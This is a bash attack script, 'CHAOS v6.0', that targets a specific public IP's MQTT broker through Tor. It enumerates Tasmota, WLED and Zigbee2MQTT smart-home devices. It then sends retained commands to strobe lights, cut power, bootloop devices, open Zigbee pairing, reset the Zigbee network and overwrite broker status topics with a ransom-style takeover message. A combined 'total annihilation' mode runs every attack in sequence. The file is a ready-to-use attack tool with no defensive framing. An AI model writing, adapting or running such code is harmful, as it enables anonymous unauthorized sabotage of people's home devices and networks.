#!/bin/bash
# CHAOS v6.0 - TASMOTA/WLED/ZIGBEE2MQTT ANNIHILATOR
set -euo pipefail

# TARGET SYSTEM
HOST="82.22.173.161"
PORT="1883"
TOR="torsocks"

MAX_BRIGHT="255"
CHAOS_STATUS="TRUSTEDF57 ANARCHY"
RANSOM_MSG="💀 TRUSTEDF57 TOTAL SYSTEM TAKEOVER v6.0 💀
ALL LIGHTS/TVs/CONTROLLERS COMPROMISED
POWER | BRIGHTNESS | CONTROL LOCKED"

ENCRYPT_PAYLOAD() {
    echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "CHAOS-V60-ANNIHILATE" 2>/dev/null | sed 's/=//g'
}

TOR_PUB() {
    local topic=$1 payload=$2 qos=2
    [[ $# -eq 3 ]] && qos=$3
    ${TOR} mosquitto_pub -h "${HOST}" -p "${PORT}" -r -q "$qos" -t "$topic" -m "$payload"
}

discover_devices() {
    echo "[🔍] DISCOVERING ${HOST}:${PORT} (30s)..."
    
    timeout 30 ${TOR} mosquitto_sub -h "${HOST}" -p "${PORT}" -t "#" -v | \
    tee /dev/tty | \
    grep -E "(Tasmota|wled|zigbee2mqtt)" | \
    grep -v "zigbee2mqtt/bridge" | \
    sed 's|.*/||;s|/.*||' | \
    grep -v '^$' | \
    sort -u > "chaos_devices.txt"
    
    echo "📋 Devices trovati:"
    grep -E "(Tasmota|wled)" "chaos_devices.txt" | sort -u
    echo "---"
    grep "zigbee2mqtt" "chaos_devices.txt" | head -5
}

load_devices() {
    if [[ -f "chaos_devices.txt" ]]; then
        mapfile -t DEVICES < "chaos_devices.txt"
        echo "[📱] Caricati ${#DEVICES[@]} devices"
        return 0
    else
        echo "❌ Run discovery prima!"
        DEVICES=()
        return 1
    fi
}

show_menu() {
    clear
    DEV_COUNT=${#DEVICES[@]}
    cat << EOF
┌─ TRUSTEDF57- ${HOST}:${PORT} (${DEV_COUNT} DEVICES) ─┐
│ 1)  FULL SYSTEM DISCOVERY                          │
│ 2)  STROBE ALL LIGHTS (255/0 LOOP)                 │
│ 3)  ALL POWER OFF                                  │
│ 4)  ALL POWER ON + MAX BRIGHT                      │
│ 5)  RAINBOW DISCO MODE                             │
│ 6)  MQTT BROKER RANSOM OVERWRITE                   │
│ 7)  TASMOTA BOOTLOOP CMND                          │
│ 8)  WLED MATRIX CHAOS                              │
│ 9)  ZIGBEE2MQTT FLOOD ATTACK                       │
│ 0)  TOTAL SYSTEM ANNIHILATION                      │
│ X)  EXIT                                           │
└──────────────────────────────────────────────────────┘
EOF
}

check_devices() {
    [[ ${#DEVICES[@]} -eq 0 ]] && { 
        echo "❌ No devices! Run 1) DISCOVERY"
        return 1
    }
    return 0
}

# TASMOTA ATTACKS
tasmota_strobe_all() {
    check_devices || return
    echo "[💡] STROBE ${#DEVICES[@]} Tasmota..."
    for dev in "${DEVICES[@]}"; do
        [[ $dev == Tasmota* ]] || continue
        TOR_PUB "Tasmota/${dev}/cmnd/Power" "TOGGLE" 1
        TOR_PUB "Tasmota/${dev}/cmnd/POWER" "1"
        TOR_PUB "Tasmota/${dev}/cmnd/Bri" "255"
    done
    echo "✅ Strobe deployed"
}

tasmota_power_off() {
    check_devices || return
    echo "[🔴] POWER OFF Tasmota..."
    for dev in "${DEVICES[@]}"; do
        [[ $dev == Tasmota* ]] || continue
        TOR_PUB "Tasmota/${dev}/cmnd/Power" "0"
    done
    echo "✅ OFF"
}

tasmota_max_bright() {
    check_devices || return
    echo "[🟢] MAX POWER+BRIGHT Tasmota..."
    for dev in "${DEVICES[@]}"; do
        [[ $dev == Tasmota* ]] || continue
        TOR_PUB "Tasmota/${dev}/cmnd/Power" "1"
        TOR_PUB "Tasmota/${dev}/cmnd/Bri" "255"
        TOR_PUB "Tasmota/${dev}/cmnd/Color" "255,255,255"
    done
    echo "✅ MAX"
}

tasmota_bootloop() {
    check_devices || return
    echo "[💥] BOOTLOOP Tasmota..."
    bootloop="Power1;Delay 500;Power0;Delay 300;Power1;Delay 1000;Power0;LOOP"
    for dev in "${DEVICES[@]}"; do
        [[ $dev == Tasmota* ]] || continue
        TOR_PUB "Tasmota/${dev}/cmnd/Backlog" "${bootloop}"
    done
    echo "✅ Bootloop"
}

# WLED ATTACKS
wled_rainbow_disco() {
    check_devices || return
    echo "[🌈] RAINBOW DISCO WLED..."
    for dev in "${DEVICES[@]}"; do
        [[ $dev == wled* ]] || continue
        TOR_PUB "wled/${dev}/win" "T"  # White temp
        TOR_PUB "wled/${dev}/fx" "38"  # Rainbow
        TOR_PUB "wled/${dev}/bri" "255"
        TOR_PUB "wled/${dev}/sx" "255" # Speed max
    done
    echo "✅ Disco mode"
}

wled_matrix_chaos() {
    check_devices || return
    echo "[🌈] MATRIX CHAOS WLED..."
    chaos_seq="fx 73;sx 255;ix 255;Delay 2000;fx 45;sx 128;ix 0;Delay 3000;fx 12;sx 255;ix 128"
    for dev in "${DEVICES[@]}"; do
        [[ $dev == wled* ]] || continue
        TOR_PUB "wled/${dev}/win" "F"  # FX mode
        TOR_PUB "wled/${dev}/bri" "255"
        TOR_PUB "wled/${dev}/backlog" "${chaos_seq}"
    done
    echo "✅ Matrix chaos"
}

# ZIGBEE2MQTT FLOOD
zigbee_flood() {
    check_devices || return
    echo "[🏠] ZIGBEE FLOOD ATTACK..."
    TOR_PUB "zigbee2mqtt/bridge/request/lan/action" '{"action": "permit_join", "permit_join": {"duration": 65535}}'
    TOR_PUB "zigbee2mqtt/bridge/request/network/reset" '{"network": "reset"}'
    for dev in "${DEVICES[@]}"; do
        [[ $dev == zigbee2mqtt* ]] || continue
        TOR_PUB "zigbee2mqtt/${dev}/set" '{"state": "TOGGLE"}'
    done
    echo "✅ Flooded"
}

# GLOBAL ATTACKS
broker_ransom() {
    echo "[🔒] BROKER RANSOM..."
    TOR_PUB "\$SYS/brokers/${HOST}/sysdescr" "${RANSOM_MSG}"
    TOR_PUB "\$SYS/brokers/${HOST}/version" "${CHAOS_STATUS}"
    TOR_PUB "zigbee2mqtt/bridge/state" '{"state": "ANNIHILATED"}'
    echo "✅ Ransomed"
}

total_annihilation() {
    check_devices || return
    echo "🎯 TOTAL ANNIHILATION v6.0..."
    tasmota_power_off
    sleep 1; tasmota_max_bright
    sleep 2; wled_rainbow_disco
    sleep 2; tasmota_strobe_all
    sleep 2; broker_ransom
    sleep 2; zigbee_flood
    sleep 2; tasmota_bootloop
    sleep 2; wled_matrix_chaos
    echo "💀 SYSTEM ANNIHILATED!"
}

# MAIN
DEVICES=()
clear; echo "💀 CHAOS v6.0 - ${HOST}:${PORT} - HOME ANNIHILATOR"

while true; do
    show_menu
    read -r CHOICE
    case "${CHOICE}" in
        1) discover_devices; load_devices ;;
        2) tasmota_strobe_all ;;
        3) tasmota_power_off ;;
        4) tasmota_max_bright ;;
        5) wled_rainbow_disco ;;
        6) broker_ransom ;;
        7) tasmota_bootloop ;;
        8) wled_matrix_chaos ;;
        9) zigbee_flood ;;
        0) total_annihilation ;;
        [Xx]) echo "EXIT"; exit 0 ;;
        *) echo "❌ ${CHOICE} invalido" ;;
    esac
    echo; read -p "⏸️  ENTER..."
done
